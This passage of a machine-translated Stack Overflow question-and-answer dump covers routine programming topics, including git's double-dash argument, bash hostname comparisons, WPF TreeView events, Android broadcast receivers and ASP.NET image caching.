$alt = get_post_meta($photo->ID, '_wp_attachment_image_alt', true);
if(count($alt)) echo $alt;

$image_title = $photo->post_title;
$caption = $photo->post_excerpt;
$description = $photo->post_content; 
```

# html - 表单提交期间“required”/“pattern”和“disabled”属性的兼容性

> ID：15973149
> 
> 赞同：2
> 
> 时间：2013-04-12T13:52:47.693
> 
> 标签：html, w3c

我阅读了以下官方文档：

*   [http://www.w3.org/TR/html-markup/input.text.html#input.text.attrs.pattern](http://www.w3.org/TR/html-markup/input.text.html#input.text.attrs.pattern)
*   [http://www.w3.org/TR/html-markup/input.text.html#input.email.attrs.required](http://www.w3.org/TR/html-markup/input.text.html#input.email.attrs.required)

*   [http://www.w3.org/TR/html-markup/input.text.html#input.email.attrs.disabled](http://www.w3.org/TR/html-markup/input.text.html#input.email.attrs.disabled)

但是文档缺乏描述在表单提交期间使用这两个属性时会发生什么。

我希望`disabled`元素绕过验证（`required`和`pattern`）。

或者我应该在 W3 邮件列表上问这样的问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T17:04:54.650

从我所见，是的，禁用将绕过其他要求。例如禁用所需的输入实际上是不需要它。

# ios - Payway 集成到 iPhone 应用程序的教程？

> ID：15973150
> 
> 赞同：2
> 
> 时间：2013-04-12T13:52:49.323
> 
> 标签：ios, api, transactions, paypal

我想使用 PayWay e-com 从我的应用程序进行交易。由于我是这项技术的新手，我不知道从哪里开始以及如何将它集成到我的具有 php 后端的 iPhone 应用程序中。

任何人都可以建议一些好的教程从这个开始吗？我发现有两种方法可以在我们的应用程序中使用它。

1.PayWay网

2.PayWay API

我想使用第二个，即PayWay API。请提出一些好的参考，这将有助于集成到 ios 应用程序。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T06:46:47.883

[您可以通过联系PayWay 技术服务台](https://www.payway.com.au/core/ContactHelpdeskView)获得免费的测试设施。这将使您可以访问系统以下载示例代码和您需要的软件。

您已将您的问题标记为 PayPal。仅通过 PayWay Net 支持 PayPal，不支持 PayWay API。

要使用 PayWay Net，您需要将持卡人的浏览器重定向到 PayWay 网站。使用 PayWay API，您的系统可以直接与 PayWay 服务器对话。PayWay Net 的优势在于您的系统不需要处理信用卡号码和通过 PCI-DSS。PayWay API 的优势在于您可以构建更加无缝的集成并处理无法向持卡人显示 Web 浏览器的情况。

（免责声明：我为西太平洋银行工作）。

# c++ - 其他静态库使用的静态库的变化

> ID：15973153
> 
> 赞同：1
> 
> 时间：2013-04-12T13:52:54.003
> 
> 标签：c++, c, linker

我的项目中有 2 个库文件 lib1.a 和 lib2.a。Lib1.a 正在使用 lib2.a 。我已经给出了 lib2.a 的源代码，但我没有 lib1.a 的源代码。对于我的项目，我更改了 lib2.a，可以说我在函数中添加了一个局部变量。

我的问题，函数名没有改变，我需要用改变的 lib2.a 重新编译 lib1.a 吗？无论如何我告诉链接器“lib1.a 应该使用新的 lib2.a”而没有 lib1.a 的源代码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T13:56:38.557

如果它只是像您所说的添加的局部变量，则不需要重建其他库。这是因为静态库通常不会直接相互链接，而是可执行文件最终将它们全部链接在一起。

# javascript - 禁用 plugin.jar /JSObject 的安全原因是什么

> ID：15973157
> 
> 赞同：0
> 
> 时间：2013-04-12T13:52:59.357
> 
> 标签：javascript, security, plugins, applet, jsobject

我正在开发一个小程序，想知道为什么像其他 Java 库一样无法访问“plugin.jar”以及为什么出于安全原因也禁用 JSObject 的确切安全原因是什么。

我能找到的唯一声明是，出于安全原因，它已被禁用，但我找不到任何进一步的信息。

[http://docs.oracle.com/javase/7/docs/technotes/guides/plugin/developer_guide/java_js.html](http://docs.oracle.com/javase/7/docs/technotes/guides/plugin/developer_guide/java_js.html)

希望这里有人知道一些细节。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T23:41:32.600

我的看法是，一旦涉及到另一种语言，它不会立即受制于 Java 安全沙箱，JVM 实际上就不能对小程序/其他事物的总体影响负责，因此不安全。

[`AccessController`使用do 特权](http://docs.oracle.com/javase/7/docs/api/java/security/AccessController.html#method_summary)方法查看效果的另一面。他们将信任重新添加到可能由第 3 方调用的小程序方法中。

# wpf - wpf TreeView - 如何在 IsExpanded 属性更改时调用函数

> ID：15973162
> 
> 赞同：2
> 
> 时间：2013-04-12T13:53:18.147
> 
> 标签：wpf, treeview

当 TreeViewItem 属性 IsExpanded 更改时，XAML 中是否可以调用函数？

我相信不太好的替代方法是遍历所有 TreeViewItems 并执行 item.IsExpanded += 处理程序调用，如果我理解正确的话。

或者我可以检查我猜想的扩展器元素上的点击。

我正在做的是保持树的展开/折叠状态。请先回答第一个问题，然后再提出其他方法来坚持这一点，只是为了让我了解属性和 xaml。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T18:43:46.077

基于 Joel 的回答，您可以`EventSetter`在 TreeViewItem`Style`中使用 s 来引用代码隐藏中的事件处理程序：

```
<TreeView ... >
    <TreeView.ItemContainerStyle>
        <Style TargetType="TreeViewItem" >
            <EventSetter Event="TreeViewItem.Expanded" Handler="OnTreeExpanded" />
            <EventSetter Event="TreeViewItem.Collapsed" Handler="OnTreeCollapsed" />
        </Style>
    </TreeView.ItemContainerStyle>
    ... 
```

代码隐藏 - 普通事件处理程序：

```
private void OnTreeExpanded(object sender, RoutedEventArgs e)
{
    var tvi = (TreeViewItem)sender;
    ...
    e.Handled = true;
}
private void OnTreeCollapsed(object sender, RoutedEventArgs e)
{
    var tvi = (TreeViewItem)sender;
    ...
    e.Handled = true;
} 
```

注意：确保您`e.Handled = true`在事件处理程序中进行了设置，否则您还将从当前 TreeViewItem 的所有父级获取事件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:08:14.517

我会使用以下方法将 TreeViewItem 的 IsExpanded 属性绑定到我的模型：

```
 <TreeView.ItemContainerStyle>
                        <Style TargetType="TreeViewItem">
                            <Setter Property="IsSelected" Value="{Binding IsSelected}" />
                            <Setter Property="IsExpanded" Value="{Binding IsExpanded}" />
                        </Style>
                    </TreeView.ItemContainerStyle> 
```

然后我可以通过模型运行并获取 IsExpanded 的值并保存它。此外，在还原时，只需设置 IsExpanded 属性。

由于您需要在更改时调用其他代码，因此请像这样实现 IsExpanded：

```
private bool _IsExpanded;
public bool IsExpanded
{
    get { return _IsExpanded; }
    set
    {
        if (_IsExpanded == value) return;
        _IsExpanded = value;
        NotifyPropertyChanged( "IsExpanded" );//or however you need to do it
        CallSomeOtherFunc();//this is the code that you need to be called when changed.
    }
} 
```

# xcode - 自动布局不能正常工作

> ID：15973167
> 
> 赞同：0
> 
> 时间：2013-04-12T13:53:33.133
> 
> 标签：xcode, iphone-developer-program

我正在尝试创建一个与 iPhone 4s 和 5 兼容的应用程序，但是当我在 iphone 4S 中运行时，我的屏幕出现错误...

看图片 ![我需要应用程序看起来像这样](https://i.stack.imgur.com/dAiJe.png)

![该应用程序看起来像这样](https://i.stack.imgur.com/EteOw.png)

![脸书按钮](https://i.stack.imgur.com/eTzvr.png)

![方形按钮](https://i.stack.imgur.com/B6ZIW.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:20:45.323

您没有明确说明登录按钮和其他按钮之间的关系，因此约束只是将其留在原处，而其他按钮确实有约束，并且正在相应地进行调整。尝试向登录按钮添加约束

# iphone - Titanium appcelerator 构建失败

> ID：15973170
> 
> 赞同：3
> 
> 时间：2013-04-12T13:53:34.103
> 
> 标签：iphone, ios, xcode, titanium, titanium-mobile

我正在尝试在 iPad 模拟器中运行我的应用程序，但每当我尝试模拟时，我都会收到此错误。我已经更新了所有内容，非常感谢一些对 appcelerator noob 的帮助。任何想法都会有所帮助。

```
[ERROR] :  ** BUILD FAILED **
[ERROR] :  The following build commands failed:
[ERROR] :   Ld "build/Debug-iphonesimulator/Neoplastic Heme.app/Neoplastic Heme" normal i386
[ERROR] :  (1 failure) 
```

这是我在 xcode 中遇到的第一个错误。也许这有帮助。

```
Ld "/Users/john/Library/Developer/Xcode/DerivedData/Neoplastic_Heme-amibyrwaylsahtgseinqplkoqzqx/Build/Products/Debug-iphonesimulator/Neoplastic Heme.app/Neoplastic Heme" normal i386
cd "/Users/john/Desktop/Neoplastic Heme/build/iphone"
setenv IPHONEOS_DEPLOYMENT_TARGET 4.0
setenv PATH "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin"
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang++ -arch i386 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.0.sdk -L/Users/john/Library/Developer/Xcode/DerivedData/Neoplastic_Heme-amibyrwaylsahtgseinqplkoqzqx/Build/Products/Debug-iphonesimulator "-L/Users/john/Desktop/Neoplastic Heme/build/iphone/lib" -F/Users/john/Library/Developer/Xcode/DerivedData/Neoplastic_Heme-amibyrwaylsahtgseinqplkoqzqx/Build/Products/Debug-iphonesimulator -filelist "/Users/john/Library/Developer/Xcode/DerivedData/Neoplastic_Heme-amibyrwaylsahtgseinqplkoqzqx/Build/Intermediates/Neoplastic Heme.build/Debug-iphonesimulator/Neoplastic Heme-iPad.build/Objects-normal/i386/Neoplastic Heme.LinkFileList" -Xlinker -objc_abi_version -Xlinker 2 -ObjC -weak_framework iAd -fobjc-link-runtime -Xlinker -no_implicit_dylibs -mios-simulator-version-min=4.0 -framework Foundation -weak_framework UIKit -framework CoreGraphics -framework AddressBook -framework AddressBookUI -framework CFNetwork -framework CoreLocation -framework MapKit -framework MessageUI -framework MobileCoreServices -framework OpenGLES -framework QuartzCore -framework SystemConfiguration -lsqlite3 -lz -framework AudioToolbox -weak_framework MediaPlayer -framework AVFoundation -lxml2 -framework StoreKit -lTiCore -ltiverify -lti_ios_debugger -licucore -o "/Users/john/Library/Developer/Xcode/DerivedData/Neoplastic_Heme-amibyrwaylsahtgseinqplkoqzqx/Build/Products/Debug-iphonesimulator/Neoplastic Heme.app/Neoplastic Heme" 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-12T15:54:32.173

清理构建。许多错误可以通过执行干净的构建来修复。[http://www.titaniumtips.com/files/how_to_clean_the_build_folder.php](http://www.titaniumtips.com/files/how_to_clean_the_build_folder.php)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-10-01T20:18:46.260

我最近也遇到了这个错误。在我的情况下，解决方案是更新/删除为旧 SDK 版本构建的任何模块。

我的模块有一段时间没有更新了，但是 Titanium SDK 已经更新了。该错误信息不是很丰富，但是一旦我删除了模块，错误就消失了，我可以再次构建。

但在尝试此之前，请始终尝试清理项目。它通常会有所帮助！这应该是第一步，如果这不起作用，请尝试我的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-06T13:37:30.093

**TLDR：阅读粗体字。**

我已经为这个问题苦苦挣扎了一天多，完全干净地重新安装了我的 Mac、Titanium 和 xCode，但它仍然给了我这个错误。

我创建了一个新项目，并在我尝试运行它时（其中仍包含 Titanium 示例代码）。我得到了完全相同的错误。

事实证明，对我来说，问题是我试图通过以太网连接在外部（服务器）硬盘驱动器上创建项目。这似乎在生成 tiapp.xml 后就以某种方式破坏了它，即使在手动检查中我找不到任何东西。

**我的解决方案是在本地硬盘上创建项目。**（在 Mac 上，而不是在服务器上。）然后，您可以根据需要将其复制到服务器。这似乎是 Mac 不总是喜欢使用基于 Windows 的文件系统的问题。

希望这可以帮助某人。

# java - 将可变数量的列从查询导出到 excel

> ID：15973171
> 
> 赞同：0
> 
> 时间：2013-04-12T13:53:37.210
> 
> 标签：java, excel, apache-poi, export-to-excel, resultset

我正在尝试将复杂查询的输出写入 Excel。为此，我使用 JDBC 并创建了一个返回类型为“ResultSet”的函数，通过该函数我将获得查询的输出。

要将 ResultSet Rows 写入 excel，我应该执行以下操作：

```
 HSSFRow row = firstSheet.createRow(index);
    row.createCell(0).setCellValue(rs.getInt(1));
    row.createCell(1).setCellValue(rs.getInt(2));
    row.createCell(2).setCellValue(rs.getString(2));
    row.createCell(3).setCellValue(rs.getString(3)); 
```

现在的问题是，复杂查询的结果集包括可变数量的行和列，具体取决于我们运行需要导出到 excel 的查询的日期。有没有通过编程可行的方法我可以处理这种情况并将查询结果导出到excel中。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:02:19.897

You should use `ResultSet.getMetaData()` method and, for example, iterate for `ResultSetMetaData.getColumnCount()` times.

# c# - .net 动态生成的单选按钮附加到数据列表

> ID：15973174
> 
> 赞同：0
> 
> 时间：2013-04-12T13:53:48.453
> 
> 标签：c#, asp.net, .net, vb.net

我有一个 asp.net 数据列表，它基本上用作转发器，在网格中创建一个图像列表，每行 4 个图像。我为每个单元格生成了一个单选按钮，其中包含一个隐藏字段，其中包含每个单元格中图像的 ID。

```
 <asp:DataList runat="server" ID="dlCertImages" RepeatColumns="4">
    <ItemTemplate>
    <table cellpadding="10px" cellspacing="10px">
        <tr>
        <td>
        <asp:RadioButton ID="rb" runat="server" />            
        <asp:HiddenField ID="hf_rb" runat="server" Value='<%#Eval("CertificateImageID")%>' /> 
         </td>
         <td>
         <a href="ResizeImage.aspx?filename=ImagesCerts/<%# Eval("ImageSrc")%>&width=400&height=375" class="preview"><img src="ReSizeImage.aspx?filename=ImagesCerts/<%# Eval("ImageSrc")%>&width=150&height=137" /></a>
         </td>
         </tr>
        </table>
         </ItemTemplate>
</asp:DataList> 
```

最终目标是让他们只选择一个图像。首先，这是最好的方法吗？其次，提交表单后，如何循环遍历数据列表以查看选择了哪个项目？

# android - Android：从广播接收器启动一个活动

> ID：15973180
> 
> 赞同：0
> 
> 时间：2013-04-12T13:54:22.937
> 
> 标签：android, android-activity, broadcastreceiver, android-broadcast

我想从广播接收器开始一个活动。问题是，当我尝试启动它时，我收到一个异常，告诉我添加“FLAG_ACTIVITY_NEW_TASK”标志，因为我的接收器已注册到服务而不是活动中。因此，我将代码修改为 BroadcastReceiver 类：

```
public void onReceive(Context context, Intent intent) {
    if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)) {
    Intent start=new Intent(context,MainActivity.class);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(start);
} 
```

但我的活动没有开始。有谁可以解释我为什么会出现这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:18:15.727

你可以使用这个：-

```
 @Override
public void onReceive(Context context, Intent intent) {

   intent.setClass(context, nextgoingactivity);
    intent.putExtra("sipcallid", sipAddress); // your data
 intent.putExtra("sipAddress", sipcallid);  // your data
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent); 

} 
```

并更新您的 AndroidManifesh.xml，

```
 <receiver android:name=".IncomingCallReceiver" android:label="Call Receiver">
        <intent-filter>
            <action android:name=".nextgoingactivity"/>
        </intent-filter>
     </receiver> 
```

它应该可以解决您的查询！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T13:56:21.713

我认为问题出在标志上，它是这样使用的

```
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
```

但是你已经使用了`addFlags()`函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:04:39.403

我想这只是一个错字。

你必须打电话`start.addFlags()`，不是`intent.addFlags()`。

# android - Android：滑动标签（底部的工具栏）

> ID：15973181
> 
> 赞同：0
> 
> 时间：2013-04-12T13:54:26.610
> 
> 标签：android, tabs, toolbar

我想在按钮上有一个工具栏。我知道它违反了 Android 指南，但我打算只为特别要求它的客户启用它。

我想象底部的低高度条看起来像这样：[item1][item2][item3] 后面是可见区域之外的更多项目。然后人们应该能够滑动它以查看其余项目。

我不想主持多个活动等。它们只是应用程序中（可能是动态确定的）热门区域的快捷方式的额外便利栏。（不是菜单项/操作栏项，例如“共享”、“首选项”等）

我已经在某些应用程序中看到了我想要的东西，但我不确定控件的名称。好像不是内置控件？（至少我看到的标签支持似乎有点不同，需要一个 TabHost）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T19:44:28.370

Are you looking for a [HorizontalScrollView](http://developer.android.com/reference/android/widget/HorizontalScrollView.html)?

# git - Git - 为什么在已删除文件上运行命令时需要双破折号？

> ID：15973182
> 
> 赞同：11
> 
> 时间：2013-04-12T13:54:26.893
> 
> 标签：git, git-log

考虑一个 git 存储库，其中一个文件曾经被删除。

```
git rm path/to/file
git commit -a -m"testing" 
```

好的，现在我想查看`git log`文件，但我收到了经典的错误消息：

```
git log path/to/file
fatal: ambiguous argument 'path/to/file': unknown revision or path not in the working tree.
Use '--' to separate paths from revisions 
```

解决方案很简单 - 添加`--`：

```
git log -- path/to/file 
```

但为什么？为什么需要这个？这里的理由是什么？git 不能做一个有根据的猜测，这可能曾经是一个文件吗？我理解“歧义”问题 - 但从来没有那个名字的标签。如果文件曾经被删除，并且没有标签存在，那么选择“文件解释”总是不错的选择。

另一方面，可以有一个与文件同名的标签，它`git log`处理得很好：

```
fatal: ambiguous argument 'path/to/file': both revision and filename
Use '--' to separate filenames from revisions 
```

这种行为似乎不一致。谁能解释一下 git 的开发者的想法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-12T15:12:49.947

`git log` could be used on files as well as on branches, tags and so on.

Assume you have a folder called `a/b/c`, you'll get the commits for this **folder** using

```
git log a/b/c 
```

That's fine.

You could also have a branch called `d/e/f`. You'll get the commits for this **branch** using

```
git log d/e/f 
```

That's fine too.

Things start to get complicated if the item where `git log` should work on could not be clearly determined. If you're stupid and call your **branch** `a/b/c` too, git has no clue whose log shall be printed: that of the *branch* `a/b/c` or the log of your *directory* `a/b/c`? Therefore, you have to tell a bit more about the information you want to receive:

*   show the log of the **branch** `a/b/c`:
    `git log a/b/c --`
*   show the log of the **folder** `a/b/c` in the current branch:
    `git log -- a/b/c`
*   show the log of the **folder** `a/b/c` in the `a/b/c` branch:
    `git log a/b/c -- a/b/c`

With the deleted file, you have a similar problem: there's neither a file called `path/to/file` present in the working copy, nor is there a branch called `path/to/file`. This is the reason why you have to specify what you want.

Of course, git could know that there **was** a file called `path/to/file` 20.000 revisions ago but this would require (worst case) to search the entire history of your project whether such a file existed or not.

By explicitly specifying the file path after the `--`, you tell git:

> search harder for that file, even if it takes hours

* * *

**Conclusion (answering your question):**
in your case, the `--` is needed because otherwise `git log` would work slower in general.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-12T14:49:14.440

为什么文件存在与不存在时的差异？我们来看看案例：

1.  修订和文件名都存在。显然模棱两可。
2.  存在修订并且文件名不存在。显然不是模棱两可。
3.  修订版不存在，文件名存在。显然不是模棱两可。
4.  修订版不存在，文件名也不存在。模糊的？

它的确是。

要知道某个文件是否曾经存在于某个路径意味着遍历历史、打开每个提交、打开每个树并遍历树以查看该路径当时是否存在。在具有大量提交和深度路径的大型存储库中......这可能会变得昂贵，尤其是在慢速磁盘上。

但！你说。这不正是这样`git log filename`做的吗？答案是肯定的，是的。不同的是，当我运行`git log filename`并且知道该文件存在时，便`git-log` *知道*我要花时间来获取此历史记录。

相反，如果我运行`git log foo`并且 foo 不是当前存在的修订版或文件，那么它将需要花费时间来遍历整个图表，只是为了告诉我这`foo`是模棱两可的。

哎哟。

所以欢迎你`git log -- filename`告诉 git 你真的希望它在图表中行走。否则，它将下降。

旁注： git 只是`stat(2)`您在命令行上提供的参数以确定文件是否存在。它不会查看索引，也不会打开您的 HEAD 树。当然，它可以做这些事情，这将允许您使用`git log filename`删除`filename`未上演提交的位置。这似乎是一个非常合理的变化。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-12T14:36:24.240

> 从来没有那个名字的标签。

你为什么这么说？ `git tag path/to/file`工作得很好。

它真的很简单：`git rm`只接受路径名；`git log`接受引用名称和路径名称，首先是引用名称，并且任何可能是路径名的东西也可能是引用名称——这对于可能是引用名称的定义来说并不是一个规则。

在小型项目中， git log 很容易确定它是否有效，它必须是某个源文件的路径，但此时您必须做出判断，平衡可能性和成本这里所有可能的错误。您是否更有可能要求不再存在的文件的日志，或者您对现有路径名或现有引用进行了粗略处理？ `git log remote/ref`很常见。我认为 git 只是假设一个与当前不匹配的名称很可能是一个错字。

# c# - asp.net 不刷新母版页中新上传的照片

> ID：15973183
> 
> 赞同：0
> 
> 时间：2013-04-12T13:54:28.607
> 
> 标签：c#, asp.net, master-pages, master-slave

我有一个个人资料 aspx 文件，并且有文件上传按钮来上传个人资料照片。当您单击文件上传按钮时，它会打开文件选择器窗口。当用户选择文件并关闭该文件选择器窗口时，将提交主页。照片上传成功。但是当页面再次加载时，我看到母版页中的照片在再次刷新之前不会改变。

这是将照片从孩子加载到母版页的代码，

```
 dbCommand = db.GetStoredProcCommand(Select_Users_Photo");
        db.AddInParameter(dbCommand, "user_id", DbType.Guid, new Guid(Session["SessionUserId"].ToString().Trim()));
        IDataReader dr = db.ExecuteReader(dbCommand);
        if (dr.Read())
        {
            image_user.ImageUrl = dr["PhotoPath"].ToString().Trim();
        }
        else
            image_user.ImageUrl = "images/man.jpg";
        dr.Close();
        dr.Dispose(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T13:59:31.883

`?mtime=1257316941`在图片网址的末尾附加。如果图像存在于指定位置。它肯定会显示更新的图像。

```
 if (dr.Read())
    {
        image_user.ImageUrl = dr["PhotoPath"].ToString().Trim()+ "?mtime=1257316941";
    }
    else
        image_user.ImageUrl = "images/man.jpg"+ "?mtime=1257316941"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T13:59:58.957

您的上传过程和检索过程可能很好。问题将与图像的缓存有关。有几种方法可以解决这个问题。

最简单的方法是在图像标签上添加一个随机查询字符串参数——这样浏览器每次都会认为它是不同的图像，并且总是从服务器请求新的图像。

```
<img src="/path-to-image/img.png?randomval=<%= Guid.NewGuid() %>"> 
```

因此，根据您的代码，它将是：

```
image_user.ImageUrl = dr["PhotoPath"].ToString().Trim() + "?randomval=" + Guid.NewGuid(); 
```

还有其他防止缓存的方法，但这可能是最快和最简单的，不会破坏页面的其余部分。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-12T15:33:50.280

如果缓存这不是问题，那么它必须与您的页面生命周期有关。根据您到目前为止所拥有的内容无法判断，但我唯一能想到的是您在问题中的代码（设置图像 URL）包含在 a 中`if (!IsPostback)`，因此它不会在上传时更新，但会在页面完全`GET`加载时更新。

在该行上抛出一个断点，看看它何时真正被击中。

# shell - 在 shell 脚本中检查 $HOSTNAME 的 if 语句

> ID：15973184
> 
> 赞同：38
> 
> 时间：2013-04-12T13:54:29.557
> 
> 标签：shell, unix, testing

所以我想根据主机设置一些不同的路径，但不幸的是它不起作用。这是我的脚本：

```
if [$HOSTNAME == "foo"]; then
    echo "success"
else
    echo "failure"
fi 
```

这就是发生的事情：

```
-bash: [foo: command not found
failure 
```

我确定 $HOSTNAME 是 foo，所以我不确定问题出在哪里。不过，我对 bash 还是很陌生。任何帮助，将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2013-04-12T13:57:35.060

在 shell 中比较字符串的 POSIX 和可移植方式是

```
if [ "$HOSTNAME" = foo ]; then
    printf '%s\n' "on the right host"
else
    printf '%s\n' "uh-oh, not on foo"
fi 
```

但是，case 语句可能更灵活：

```
case $HOSTNAME in
  (foo) echo "Woohoo, we're on foo!";;
  (bar) echo "Oops, bar? Are you kidding?";;
  (*)   echo "How did I get in the middle of nowhere?";;
esac 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T13:56:54.913

您在左括号后缺少一个空格。使用双引号“不解析”变量内容也很好：

```
if [ "$HOSTNAME" = "foo" ]; then 
    ... 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-02-06T16:46:09.220

```
#!/bin/bash

if [[ $(hostname) == "home" ]] || [[ $(hostname) == "home2" ]]; then
    echo "True"
fi 
```

# android - 从 android 浏览器启动我的 android 应用程序

> ID：15973187
> 
> 赞同：0
> 
> 时间：2013-04-12T13:54:33.297
> 
> 标签：android, android-intent

我使用下面的代码从 Android 设备中的 Opera mini 启动应用程序。它不是每次都加载应用程序。如果我每次都更改 URI，那么它每次都会工作，但如果我使用相同的 URI，那么它将启动一次，但下次尝试不加载应用程序。

代码：

```
 <intent-filter>
                <data android:scheme="nvin.scan"  />
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.BROWSABLE" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter> 
```

我也检查了 Youtube 是否相同。如果我在浏览器中使用了 Youtube 的 URI（即 vdn.youtube://），那么它每次都可以使用。所以请让我知道我需要在我的代码中进行哪些更改才能像 Youtube 一样工作。

谢谢，

# django - 推送到heroku服务器（django）时，sqlite数据库未迁移到postgresql

> ID：15973188
> 
> 赞同：3
> 
> 时间：2013-04-12T13:54:35.580
> 
> 标签：django, heroku, dbmigrate

我将我的应用程序推送到 heroku，但似乎数据库没有迁移（数据库有 0 个表和 0 个条目）。如何正确迁移它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T15:07:24.083

如果您使用的是入门级数据库，则填充这些统计信息会有延迟。如果您在以下位置，您可以立即查看是否有桌子`psql`：

```
$ heroku pg:psql -a app_name
psql=> \dt
[...tables...] 
```

另外，请在此处查看我关于在本地使用 postgres 而不是 sqlite3 的答案（推荐）：

*   [https://stackoverflow.com/a/15373024/95741](https://stackoverflow.com/a/15373024/95741)

# hadoop - Hbase如何写入数据以及在哪里写入

> ID：15973189
> 
> 赞同：0
> 
> 时间：2013-04-12T13:54:36.143
> 
> 标签：hadoop, hbase

我是 Hbase 新手，我只想了解 Hbase 写操作。如果多个客户端在同一个表中写入，那么 Hbase 如何维护对物理文件的顺序写入。

Hbase 在哪里存储它的数据（我认为在 HDFS 中）？

我们可以将 Hbase 数据存储在 HDFS 之外吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-13T13:10:58.047

HBase 首先将数据写入 memstore，并在它已满时或根据请求将其刷新到磁盘 HBase 还将数据写入预写日志 (WAL) 以防止数据丢失（如果需要，您可以将其关闭）。

memstore 数据被刷新到存储在 HDFS 中的 HFile 中。HBase 需要 HDFS 来提供数据可用性（通过 HDFS 复制）。HBase 无法在 HDFS 之外存储数据

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:01:02.137

写操作可以参考这个链接：[http ://hbase.apache.org/book/perf.writing.html](http://hbase.apache.org/book/perf.writing.html)

# xmpp - Smack 在线用户的多用户聊天列表

> ID：15973194
> 
> 赞同：1
> 
> 时间：2013-04-12T13:54:52.277
> 
> 标签：xmpp, openfire, smack, multiuserchat

我正在使用帐户管理员从我的第三方服务器登录我的 openfire XMPP 服务器。

我需要在特定的多用户聊天中发现可用的用户。对于“可用”，我指的是房间内所有在线用户。

我知道一种方法是连接到房间并听取用户的存在，但出于我的目的，我需要即时获取完整的列表。

可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T21:34:50.987

是的，您可以为此使用 ServiceDiscovery。这是一个例子：

```
 // Obtain the ServiceDiscoveryManager associated with my Connection
      ServiceDiscoveryManager discoManager = ServiceDiscoveryManager.getInstanceFor(connection);

      // Get the items of a given XMPP entity
      // This example gets the items associated with online catalog service
      DiscoverItems discoItems = discoManager.discoverItems("plays.shakespeare.lit");

      // Get the discovered items of the queried XMPP entity
      Iterator it = discoItems.getItems();
      // Display the items of the remote XMPP entity
      while (it.hasNext()) {
          DiscoverItems.Item item = (DiscoverItems.Item) it.next();
          System.out.println(item.getEntityID());
          System.out.println(item.getNode());
          System.out.println(item.getName());
      } 
```

# javascript - 跨浏览器识别元素

> ID：15973196
> 
> 赞同：4
> 
> 时间：2013-04-12T13:54:53.483
> 
> 标签：javascript, html

我有一个在两个浏览器窗口中打开的页面，它通过套接字传达用户交互。如果有人点击一个元素，我希望它发生在另一个浏览器中。为此，我需要知道与之交互的元素。

我有几个选择，但没有一个是 100% 保证工作的。

*   按元素名称：可以有多个具有相同名称的元素。
*   按 id：并非所有元素都有 id
*   按类：并非所有元素都有一个类，并且类不是唯一的
*   按位置：如果网站在两个不同的浏览器中打开，则位置可能不同。

那么还有其他方法可以识别 100% 确定的元素吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T13:57:08.480

如果两个页面中的 HTML 完全相同，则可以简单地使用一个“路径”，该路径由父级中的索引构建，直到 document.body。它易于构建且易于使用来查找元素。

以下是计算此路径或遵循它的函数：

```
function indexInParent(node) {
    var children = node.parentNode.childNodes;
    for (var i=0; i<children.length; i++) {
         if (children[i]==node) return i;
    }
    return -1;
}

function nodePath(e) {
   var path = [];
   while (e!=document.body) {
      path.push(indexInParent(e));
      e = e.parentNode;
   }
   return path.reverse().join('-');
}

function getNode(path) {
   path = path.split('-');
   var e = document.body;
   while(path.length && e) e=e.childNodes[parseInt(path.shift())];
   return e;
} 
```

[演示](http://jsbin.com/isehey/2/edit)：点击“Run with JS”然后

*   单击一个元素以在控制台中查看路径
*   输入路径以在控制台中查看元素

# sql - SQL 到 HiveQL 生成器

> ID：15973198
> 
> 赞同：2
> 
> 时间：2013-04-12T13:54:59.267
> 
> 标签：sql, hadoop, hive, hiveql

有什么方法可以将我的 SQL 查询转换为 Hive 查询，或者任何开源工具或项目可以帮助我将一些查询从 SQL 转换为 HiveQL，以便我可以通过在 Hadoop 数据库中查询来开始我的开发？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T01:27:41.057

